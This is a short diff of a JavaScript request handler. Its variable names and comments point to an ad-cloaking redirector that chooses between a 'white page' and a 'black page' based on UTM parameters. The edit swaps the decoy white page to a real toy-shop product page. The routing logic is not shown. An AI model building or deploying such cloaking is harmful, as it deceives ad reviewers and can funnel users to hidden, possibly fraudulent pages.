@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://thedollstore.eu/mini-betty-doll-dress-beanie-pink-26-cm/";
+    const whitePageURL = "https://www.fabelab.dk/collections/news/products/soft-blocks-farm-animals-baby-toys";
     const blackPageURL = "https://nowhereher.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
